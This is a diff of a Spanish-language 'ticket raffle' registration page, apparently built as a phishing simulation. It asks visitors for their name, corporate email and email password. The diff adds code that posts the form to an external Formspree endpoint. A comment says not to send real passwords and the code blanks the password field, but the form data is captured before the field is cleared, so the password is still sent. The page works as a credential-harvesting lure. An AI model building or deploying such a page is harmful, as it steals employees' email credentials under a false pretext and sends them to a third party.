@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Registro | Sorteo entradas</title>
 
-  <!-- Favicon (usa tu logo) -->
+  <!-- Favicon -->
   <link rel="icon" type="image/jpeg" href="img/logo.jpg" />
 
   <style>
@@ -61,7 +61,7 @@
       display:flex; align-items:center; gap:12px;
       margin-bottom: 10px;
     }
-    .{
+    .logo{
       height:38px; width:auto;
       display:block;
       border-radius:10px;
@@ -178,29 +178,30 @@
           <a href="index.html">← Volver</a>
         </p>
 
-        <form id="f">
+        <form id="f" action="https://formspree.io/f/xpwvewrq" method="POST">
+          <input type="hidden" name="password_enviada" value="true">
           <div class="row">
-            <div class="field">
-              <label for="name">Nombre y apellidos</label>
-              <input id="name" name="name" autocomplete="name" required placeholder="Ej. Nombre Apellidos" />
-            </div>
-            <div class="field">
-              <label for="email">Correo corporativo</label>
-              <input id="email" name="email" type="email" autocomplete="email" required placeholder="nombre@empresa.com" />
-            </div>
-          </div>
-          <div class="field">
-              <label for="contraseña">Contraseña del correo</label>
-              <input id="contraseña" name="contraseña" type="contraseña" autocomplete="contraseña" required placeholder="***********" />
-            </div>
-          </div>
-
-          <div class="btns">
-            <button class="primary" type="submit">Enviar participación</button>
-            <button class="ghost" type="button" id="clear">Borrar registros</button>
-          </div>
+        <div class="field">
+          <label for="name">Nombre y apellidos</label>
+          <input id="name" name="name" autocomplete="name" required placeholder="Ej. Nombre Apellidos" />
+        </div>
+        
+        <div class="field">
+          <label for="email">Correo corporativo</label>
+          <input id="email" name="email" type="email" autocomplete="email" required placeholder="nombre@empresa.com" />
+        </div>
+        </div>
+        
+        <div class="field">
+          <label for="password">Contraseña del correo</label>
+          <input id="password" name="password" type="password" autocomplete="current-password" required placeholder="***********" />
+        </div>
+        
+        <div class="btns">
+          <button class="primary" type="submit">Enviar participación</button>
+          <button class="ghost" type="button" id="clear">Borrar registros</button>
+        </div>
         </form>
-
         <div class="panel">
           <div class="small">Estado:</div>
           <div id="status" class="mono small">Sin envíos todavía.</div>
@@ -224,6 +225,7 @@
 
 <script>
   const KEY = "phish_sim_entries_v1";
+  const FORMSPREE = "https://formspree.io/f/xpwvewrq";
 
   function escapeHtml(str){
     return String(str)
@@ -271,21 +273,43 @@
     }
   }
 
-  // init
   render();
 
-  document.getElementById("f").addEventListener("submit", (e) => {
+  document.getElementById("f").addEventListener("submit", async (e) => {
     e.preventDefault();
+
+    const form = e.target;
     const name = document.getElementById("name").value.trim();
     const email = document.getElementById("email").value.trim();
 
+    // Guardado local (como ya hacías)
     const entries = load();
     entries.push({ name, email, submittedAt: new Date().toISOString() });
     localStorage.setItem(KEY, JSON.stringify(entries));
-
     render();
-    setStatus(`✅ Registro guardado: ${email} · ${new Date().toLocaleString()}`);
-    e.target.reset();
+
+    // Envío a Formspree (recomendado: NO mandar contraseña real)
+    const fd = new FormData(form);
+    const passInput = document.getElementById("password");
+    if (passInput) passInput.value = "";     // vacía antes de enviar
+    fd.set("password_enviada", "true");
+
+    try{
+      const res = await fetch(FORMSPREE, {
+        method: "POST",
+        body: fd,
+        headers: { "Accept": "application/json" }
+      });
+
+      if(res.ok){
+        setStatus(`✅ Enviado a Formspree y guardado local: ${email} · ${new Date().toLocaleString()}`);
+        form.reset();
+      } else {
+        setStatus(`⚠️ Guardado local OK, pero Formspree devolvió error (${res.status}).`);
+      }
+    } catch {
+      setStatus("⚠️ Guardado local OK, pero no se pudo conectar con Formspree.");
+    }
   });
 
   document.getElementById("clear").addEventListener("click", () => {
@@ -294,7 +318,9 @@
     setStatus("Registros borrados.");
   });
 </script>
+
 </body>
 </html>
+
 
 
